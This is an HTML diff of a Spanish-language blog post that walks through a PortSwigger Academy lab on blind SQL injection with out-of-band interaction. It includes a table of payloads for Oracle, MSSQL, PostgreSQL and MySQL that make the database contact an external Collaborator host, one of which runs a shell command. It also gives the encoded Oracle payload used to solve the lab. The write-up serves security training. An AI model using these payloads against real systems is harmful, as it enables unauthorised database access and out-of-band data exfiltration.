@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="es-GT">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Lab: Blind SQL injection with out-of-band interaction'><title>Portswigger Academy Learning Path: SQL Injection Lab 15</title>
+
+<link rel='canonical' href='https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Portswigger Academy Learning Path: SQL Injection Lab 15'>
+<meta property='og:description' content='Lab: Blind SQL injection with out-of-band interaction'>
+<meta property='og:url' content='https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/'>
+<meta property='og:site_name' content='A1ux'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='sqli' /><meta property='article:tag' content='portswigger' /><meta property='article:tag' content='academy' /><meta property='article:tag' content='burpsuite' /><meta property='article:published_time' content='2021-11-11T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-11-11T00:00:00&#43;00:00'/><meta property='og:image' content='https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/head.png' />
+<meta name="twitter:title" content="Portswigger Academy Learning Path: SQL Injection Lab 15">
+<meta name="twitter:description" content="Lab: Blind SQL injection with out-of-band interaction"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/head.png' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>Volver</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/portswigger-academy-learning-path-sql-injection-lab-15/">
+                <img src="/p/portswigger-academy-learning-path-sql-injection-lab-15/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_800x0_resize_box_3.png"
+                        srcset="/p/portswigger-academy-learning-path-sql-injection-lab-15/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_800x0_resize_box_3.png 800w, /p/portswigger-academy-learning-path-sql-injection-lab-15/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="402" 
+                        loading="lazy"
+                        alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 15" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pentest-web/" >
+                pentest web
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/portswigger-academy-learning-path-sql-injection-lab-15/">Portswigger Academy Learning Path: SQL Injection Lab 15</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        Lab: Blind SQL injection with out-of-band interaction
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 11, 2021</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    2 minutos a leer
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="lab-blind-sql-injection-with-out-of-band-interaction">Lab: Blind SQL injection with out-of-band interaction</h1>
+<p>En este <!-- raw HTML omitted -->laboratorio<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted -->la finalidad es poder inyectar una consulta sql y basandonos en la ejecucion que pueda realizar el backend una consulta hacia un endpoint y genere una accion, en este caso de esto se trata. Mas que todo donde los otros tipos de sql injection a ciegas no puede llegar.</p>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>Burpsuite cuenta con una propia herramienta que es Burp Collaborator que lo que hace es apoyar a detectar vulnerabilidades a ciegas. Pero si no se cuenta con Burpsuite Pro no se puede utilizar, asi que se listan a continuacion algunas alternativas para poder explotar esta vulnerabilidad.</p>
+<blockquote>
+<p>En el laboratorio no se puede realizar alguna de estas alternativas ya que el firewall de PortswiggerAcademy bloquea</p>
+</blockquote>
+<ul>
+<li><a class="link" href="http://dnslog.cn/"  target="_blank" rel="noopener"
+    >http://dnslog.cn/</a></li>
+<li><a class="link" href="https://webhook.site/"  target="_blank" rel="noopener"
+    >https://webhook.site/</a></li>
+<li><a class="link" href="https://app.interactsh.com/"  target="_blank" rel="noopener"
+    >https://app.interactsh.com/</a></li>
+<li><a class="link" href="http://pingb.in/"  target="_blank" rel="noopener"
+    >http://pingb.in/</a></li>
+<li><a class="link" href="http://swin.es/"  target="_blank" rel="noopener"
+    >http://swin.es/</a></li>
+<li><a class="link" href="http://ceye.io/"  target="_blank" rel="noopener"
+    >http://ceye.io/</a></li>
+<li><a class="link" href="https://canarytokens.org/"  target="_blank" rel="noopener"
+    >https://canarytokens.org/</a></li>
+<li><a class="link" href="https://requestbin.net/"  target="_blank" rel="noopener"
+    >https://requestbin.net/</a></li>
+<li><a class="link" href="https://beeceptor.com/"  target="_blank" rel="noopener"
+    >https://beeceptor.com/</a></li>
+</ul>
+<h3 id="payloads">Payloads</h3>
+<p>Los payloads a inyectar segun la base de datos son los siguientes:</p>
+<table>
+<thead>
+<tr>
+<th>Backend</th>
+<th>Consulta</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Oracle</td>
+<td><code>SELECT extractvalue(xmltype('\&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\&lt;!DOCTYPE root [ \&lt;!ENTITY % remote SYSTEM &quot;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt; %remote;]&gt;'),'/l') FROM dual</code> o <code>SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')</code> solo con privilegios elevados</td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td><code>exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td><code>LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')</code> solo trabaja en windows o <code>SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'</code></td>
+</tr>
+</tbody>
+</table>
+<h4 id="explotar">Explotar</h4>
+<p>Utilizando una de las consultas podemos inyectar una consulta y enviar la consulta, y ahora collaborate nos enviara las peticiones que se han realizado.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">xxxxxxxxxxxxxxxx</span><span class="s1">&#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&#39;</span><span class="o">&lt;%</span><span class="mi">3</span><span class="n">fxml</span><span class="o">+</span><span class="k">version</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s2">&#34;1.0&#34;</span><span class="o">+</span><span class="k">encoding</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s2">&#34;UTF-8&#34;</span><span class="o">%</span><span class="mi">3</span><span class="n">f</span><span class="o">&gt;&lt;!</span><span class="n">DOCTYPE</span><span class="o">+</span><span class="n">root</span><span class="o">+</span><span class="p">[</span><span class="o">+&lt;!</span><span class="n">ENTITY</span><span class="o">+%</span><span class="mi">25</span><span class="o">+</span><span class="n">remote</span><span class="o">+</span><span class="k">SYSTEM</span><span class="o">+</span><span class="s2">&#34;http%3a//gcwtmppkxyte3s4zwxzqbfkig9mba0.burpcollaborator.net/&#34;</span><span class="o">&gt;+%</span><span class="mi">25</span><span class="n">remote</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span><span class="p">]</span><span class="o">&gt;</span><span class="s1">&#39;),&#39;</span><span class="o">/</span><span class="n">l</span><span class="s1">&#39;)+FROM+dual--
+</span></code></pre></div><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 143; 
+			flex-basis: 343px"
+	>
+	<a href="/p/portswigger-academy-learning-path-sql-injection-lab-15/repeater.png" data-size="1539x1075">
+		<img src="/p/portswigger-academy-learning-path-sql-injection-lab-15/repeater.png"
+			width="1539"
+			height="1075"
+			srcset="/p/portswigger-academy-learning-path-sql-injection-lab-15/repeater_hu5decb89ea607d037ca51e48705c853ff_151973_480x0_resize_box_3.png 480w, /p/portswigger-academy-learning-path-sql-injection-lab-15/repeater_hu5decb89ea607d037ca51e48705c853ff_151973_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="Envio de consulta con repeater">
+	</a>
+	
+	<figcaption>Envio de consulta con repeater</figcaption>
+	
+</figure></p>
+<p>Y con esto hemos resulto el lab:</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 217; 
+			flex-basis: 523px"
+	>
+	<a href="/p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto.png" data-size="1761x808">
+		<img src="/p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto.png"
+			width="1761"
+			height="808"
+			srcset="/p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto_hudb1d6fd86e50b409045069c012032baa_103793_480x0_resize_box_3.png 480w, /p/portswigger-academy-learning-path-sql-injection-lab-15/resuelto_hudb1d6fd86e50b409045069c012032baa_103793_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="Laboratorio resuelto">
+	</a>
+	
+	<figcaption>Laboratorio resuelto</figcaption>
+	
+</figure></p>
+<p>Con esto ya muestra que se ha resuelto el lab.</p>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p><a class="link" href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band"  target="_blank" rel="noopener"
+    >Laboratorio</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/sqli/">sqli</a>
+        
+            <a href="/tags/portswigger/">portswigger</a>
+        
+            <a href="/tags/academy/">academy</a>
+        
+            <a href="/tags/burpsuite/">burpsuite</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Contenidos relacionados</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/portswigger-academy-learning-path-sql-injection-lab-14/">
+        
+        
+            <div class="article-image">
+                <img src="/p/portswigger-academy-learning-path-sql-injection-lab-14/head.a629808d3c419c422297aa6a9115b9dd_huc76dcbe4719eea5620ad72b9e0798e52_74880_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-pimAjTxBnEIil6pqkRW53Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Portswigger Academy Learning Path: SQL Injection Lab 14</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/portswigger-academy-learning-path-sql-injection-lab-16/">
+        
+        
+            <div class="article-image">
+                <img src="/p/portswigger-academy-learning-path-sql-injection-lab-16/head.a629808d3c419c422297aa6a9115b9dd_huc76dcbe4719eea5620ad72b9e0798e52_74880_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-pimAjTxBnEIil6pqkRW53Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Portswigger Academy Learning Path: SQL Injection Lab 16</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/portswigger-academy-learning-path-sql-injection-lab-13/">
+        
+        
+            <div class="article-image">
+                <img src="/p/portswigger-academy-learning-path-sql-injection-lab-13/head.a629808d3c419c422297aa6a9115b9dd_huc76dcbe4719eea5620ad72b9e0798e52_74880_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-pimAjTxBnEIil6pqkRW53Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Portswigger Academy Learning Path: SQL Injection Lab 13</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/portswigger-academy-learning-path-sql-injection-lab-10/">
+        
+        
+            <div class="article-image">
+                <img src="/p/portswigger-academy-learning-path-sql-injection-lab-10/head.a629808d3c419c422297aa6a9115b9dd_huc76dcbe4719eea5620ad72b9e0798e52_74880_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-pimAjTxBnEIil6pqkRW53Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Portswigger Academy Learning Path: SQL Injection Lab 10</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/portswigger-academy-learning-path-sql-injection-lab-11/">
+        
+        
+            <div class="article-image">
+                <img src="/p/portswigger-academy-learning-path-sql-injection-lab-11/head.a629808d3c419c422297aa6a9115b9dd_huc76dcbe4719eea5620ad72b9e0798e52_74880_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-pimAjTxBnEIil6pqkRW53Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Portswigger Academy Learning Path: SQL Injection Lab 11</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2021 A1ux
+    </section>
+    
+    <section class="powerby">
+        
+
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">Tabla de contenido</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#reconocimiento">Reconocimiento</a>
+      <ol>
+        <li><a href="#payloads">Payloads</a>
+          <ol>
+            <li><a href="#explotar">Explotar</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
